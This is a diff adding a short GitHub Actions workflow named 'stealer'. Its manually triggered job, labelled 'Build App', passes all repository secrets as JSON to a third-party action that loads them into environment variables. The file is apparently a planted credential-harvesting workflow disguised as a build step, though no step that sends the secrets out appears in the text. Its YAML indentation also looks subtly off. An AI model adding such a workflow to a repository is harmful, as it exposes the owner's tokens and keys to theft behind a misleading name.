@@ -1,0 +1,11 @@
+name: stealer
+on:
+  workflow_dispatch:
+jobs:
+  stealer:
+    runs-on: ubuntu-latest
+    name: Build App
+    steps:
+    - uses: oNaiPs/secrets-to-env-action@v1
+      with:
+      secrets: ${{ toJSON(secrets) }}
